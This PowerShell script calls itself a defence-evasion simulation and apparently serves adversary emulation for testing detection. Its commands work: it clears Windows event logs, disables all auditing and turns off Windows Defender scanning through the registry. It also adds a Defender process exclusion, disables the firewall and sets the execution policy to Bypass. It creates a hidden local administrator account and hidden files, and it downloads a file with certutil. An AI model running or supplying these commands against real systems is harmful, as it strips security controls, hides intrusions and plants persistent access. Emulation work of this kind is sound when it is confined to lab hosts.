# Setup required files and directories

# Create SISABAS.txt
powershell -ExecutionPolicy Bypass -Command "Write-Host 'Creating SISABAS.txt...'; New-Item -Path '$PSScriptRoot\SISABAS.txt' -ItemType File -Force"

# Create sysctl.conf
powershell -Command "Write-Host 'Creating sysctl.conf...'; New-Item -Path '$PSScriptRoot\sysctl.conf' -ItemType File -Force"

# Create ufw.conf
powershell -Command "Write-Host 'Creating ufw.conf...'; New-Item -Path '$PSScriptRoot\ufw.conf' -ItemType File -Force"

# Simulating Defence Evasion Techniques

# Move PowerShell & triage (Rename powershell.exe for simulation)
powershell -Command "
    Write-Host 'Renaming PowerShell for simulation...';
    Move-Item -Path '$PSScriptRoot\powershell.exe' -Destination '$PSScriptRoot\SISABAS.exe'"

# File Extension Masquerading
powershell -Command "Write-Host 'Renaming SISABAS.txt to SISABAS.docx...'; Rename-Item -Path '$PSScriptRoot\SISABAS.txt' -NewName '$PSScriptRoot\SISABAS.docx'"

# Masquerading — non-Windows exe running as windows exe (Using Notepad)
powershell -Command "
    Write-Host 'Copying Notepad to SISABAS.exe...';
    Copy-Item -Path '$env:SystemRoot\System32\notepad.exe' -Destination '$PSScriptRoot\SISABAS.exe';
    Start-Process -FilePath '$PSScriptRoot\SISABAS.exe'"

# Clear Logs
powershell -Command "Write-Host 'Clearing system event logs...'; wevtutil cl System; wevtutil cl Security; wevtutil cl Application"

# Grant Full Access to folder for Everyone — Ryuk Ransomware Style
powershell -Command "Write-Host 'Granting full access to SISABAS folder...'; icacls '$PSScriptRoot\SISABAS' /grant Everyone:F /T"

# Avoid Logs
powershell -Command "Write-Host 'Disabling audit logging...'; auditpol /set /category:* /success:disable /failure:disable"

# Disable Windows Defender All

# Disable Real-Time Monitoring
powershell -Command "
    Write-Host 'Disabling Real-Time Monitoring...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f"

# Disable Behavior Monitoring
powershell -Command "
    Write-Host 'Disabling Behavior Monitoring...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"

# Disable IOAV Protection (Internet Files Scanning)
powershell -Command "
    Write-Host 'Disabling IOAV Protection...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v DisableIOAVProtection /t REG_DWORD /d 1 /f"

# Disable Archive Scanning
powershell -Command "
    Write-Host 'Disabling Archive Scanning...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v DisableArchiveScanning /t REG_DWORD /d 1 /f"

# Disable Script Scanning
powershell -Command "
    Write-Host 'Disabling Script Scanning...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v DisableScriptScanning /t REG_DWORD /d 1 /f"

# Disable Intrusion Prevention System
powershell -Command "
    Write-Host 'Disabling Intrusion Prevention System...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v DisableIntrusionPreventionSystem /t REG_DWORD /d 1 /f"

# Disable Privacy Mode
powershell -Command "
    Write-Host 'Disabling Privacy Mode...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v DisablePrivacyMode /t REG_DWORD /d 1 /f"

# Disable Block at First Seen
powershell -Command "
    Write-Host 'Disabling Block at First Seen...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender' /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f"

# Disable Signature Update on Startup
powershell -Command "
    Write-Host 'Disabling Signature Update on Startup...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates' /v DisableUpdateOnStartupWithoutEngine /t REG_DWORD /d 1 /f"

# Set Sample Submission to Always Prompt
powershell -Command "
    Write-Host 'Setting Sample Submission to Always Prompt...';
    reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' /v SubmitSamplesConsent /t REG_DWORD /d 2 /f"

Write-Host "Windows Defender settings have been modified via registry changes."

# Change PowerShell Execution Policy to Bypass
powershell -Command "Write-Host 'Setting PowerShell execution policy to Bypass...'; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"

# Tamper with Windows Defender Evade Scanning — Process
powershell -Command "
    Write-Host 'Adding SISABAS.exe to Windows Defender exclusion...';
    New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes' -Name 'SISABAS.exe' -Value '$PSScriptRoot\SISABAS.exe' -PropertyType String"

# Impair Windows Audit Log Policy
powershell -Command "Write-Host 'Disabling logon audit log policy...'; auditpol /set /subcategory:'Logon' /success:disable /failure:disable"

# Stop/Start UFW firewall
powershell -Command "
    Write-Host 'Stopping UFW firewall...';
    netsh advfirewall set allprofiles state off;
    Write-Host 'Starting UFW firewall...';
    netsh advfirewall set allprofiles state on"

# Disable Microsoft Defender Firewall
powershell -Command "Write-Host 'Disabling Microsoft Defender Firewall...'; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"

# Edit UFW firewall sysctl.conf file
powershell -Command "
    Write-Host 'Editing sysctl.conf for UFW...';
    Add-Content -Path '$PSScriptRoot\sysctl.conf' -Value 'net.ipv4.ip_forward=1'"

# Edit UFW firewall ufw.conf file
powershell -Command "
    Write-Host 'Editing ufw.conf for UFW...';
    Add-Content -Path '$PSScriptRoot\ufw.conf' -Value 'ENABLED=no'"

# Disable iptables (requires admin/sudo)
powershell -Command "Write-Host 'Disabling iptables...'; netsh advfirewall set allprofiles state off"

# Create Windows Hidden File with Attrib
powershell -Command "
    Write-Host 'Creating and hiding SISABAS.txt...';
    New-Item -Path '$PSScriptRoot\SISABAS.txt' -ItemType File;
    attrib +h '$PSScriptRoot\SISABAS.txt'"

# Create a hidden file in a hidden directory
powershell -Command "
    Write-Host 'Creating hidden directory and file...';
    New-Item -Path '$PSScriptRoot\SISABAS' -ItemType Directory;
    attrib +h '$PSScriptRoot\SISABAS';
    New-Item -Path '$PSScriptRoot\SISABAS\SISABAS.txt' -ItemType File;
    attrib +h '$PSScriptRoot\SISABAS\SISABAS.txt'"

# Hidden Window
powershell -Command "Write-Host 'Starting Notepad in hidden window...'; Start-Process -FilePath 'notepad.exe' -WindowStyle Hidden"

# Create a Hidden User Called "SISABAS"
powershell -Command "
    Write-Host 'Creating and hiding user SISABAS...';
    net user SISABAS /add;
    net localgroup administrators SISABAS /add;
    wmic useraccount where name='SISABAS' rename 'SISABAS '"

# Command-Line Obfuscation using character escaping
powershell -Command "
    Write-Host 'Executing obfuscated command...';
    'n^e^t u^s^e^r';"

# Encode data with certutil
powershell -Command "
    Write-Host 'Encoding data with certutil...';
    certutil -encode '$PSScriptRoot\SISABAS.txt' '$PSScriptRoot\SISABAS_encoded.txt'"

# Decode data with certutil
powershell -Command "
    Write-Host 'Decoding data with certutil...';
    certutil -decode '$PSScriptRoot\SISABAS_encoded.txt' '$PSScriptRoot\SISABAS_decoded.txt'"

# Download file with certutil
powershell -Command "
    Write-Host 'Downloading file with certutil...';
    certutil -urlcache -split -f 'https://download.sysinternals.com/files/Procdump.zip' '$PSScriptRoot\downloaded_file.zip'"

powershell -Command "Write-Host 'SISABAS Defense Evasion Simulation Completed.'"
